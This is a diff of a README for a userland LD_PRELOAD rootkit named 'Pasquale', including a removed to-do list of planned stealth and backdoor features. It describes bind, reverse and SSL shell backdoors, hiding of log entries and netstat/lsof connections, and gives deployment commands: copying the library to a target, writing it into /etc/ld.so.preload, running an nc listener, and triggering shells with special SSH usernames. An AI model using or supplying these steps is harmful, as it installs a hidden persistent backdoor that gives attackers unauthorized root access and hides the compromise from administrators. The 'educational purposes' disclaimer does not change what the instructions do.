@@ -1,11 +1,90 @@
-# rootkit
-Steps for finishing this project:
+# Pasquale Rootkit
 
-#1. Fix netstat. If i can make this part work, this alone is enough to differenatiate my rootkit from h0mbres.
-#2. Hijack an FTP server so I can copy files from the infected computer to mine (My personal touch) https://stackoverflow.com/questions/1658476/c-fopen-vs-open add to the fopen syscall hook. make usre it doesn't open that log file basically. connect to ftp via the root user. this gives us a root backdoor into the entire filesystem through ftp. make sure to add to the netstat stuff as well to make sure our connection is invisible. 
-#3. Hijack LSOF (There was something on the blog, in resources about this)
-#4 Openssl back connect
-#5 Extra Bonus on the Blog
-#6 Implement reverse shells
-#7 (Maybe add ipv6 but why
+## Overview
 
+Pasquale is a userland rootkit utilizing the `LD_PRELOAD` technique to hook system calls and provide various backdoor functionalities. It demonstrates advanced concepts in C programming and security.
+
+## Features
+
+- **Backdoor Access**: Provides bind shell, reverse shell, and SSL-encrypted shell backdoors.
+- **Log Manipulation**: Hides specific log entries from `vsftpd.log` and syslog.
+- **Process Hiding**: Conceals specific connections from `netstat` and `lsof`.
+
+## Installation
+
+### Prerequisites
+
+Ensure you have OpenSSL installed on your system. On macOS, use Homebrew:
+
+```bash
+brew install openssl
+```
+
+### Compilation
+
+Compile the rootkit as a shared library:
+
+```bash
+gcc pasquale.c -fPIC -shared -D_GNU_SOURCE -o lib.pack.so.6 -ldl -lssl -lcrypto
+```
+
+### Deployment
+
+1. **Upload the Library**: Transfer the compiled library to the target system.
+
+    ```bash
+    scp lib.pack.so.6 user@target:/tmp/
+    ```
+
+2. **Move the Library**: Move the library to a suitable location.
+
+    ```bash
+    mv /tmp/lib.pack.so.6 /lib/i386-linux-gnu/lib.pack.so.6
+    ```
+
+3. **Configure `LD_PRELOAD`**: Add the library to `/etc/ld.so.preload`.
+
+    ```bash
+    echo "/lib/i386-linux-gnu/lib.pack.so.6" > /etc/ld.so.preload
+    ```
+
+### Verification
+
+Verify that the library is loaded:
+
+```bash
+ldd /bin/ls
+```
+
+Check that `lib.pack.so.6` is listed.
+
+## Usage
+
+### Starting a Listener
+
+Start a listener on the attacker's machine:
+
+```bash
+nc -lvp 443
+```
+
+### Triggering the Backdoor
+
+Use one of the special usernames to trigger the desired backdoor (bind, reverse, or SSL):
+
+```bash
+ssh BIND_USER@target
+ssh REVERSE_USER@target
+ssh OPENSSL_USER@target
+```
+
+## Important Notes
+
+- **Educational Purposes**: This rootkit is intended for educational purposes only. Do not use it for malicious activities.
+- **System Impact**: Running this rootkit can have significant security implications. Use it in a controlled and legal environment.
+
+## License
+
+This project is licensed under the MIT License.
+
+---
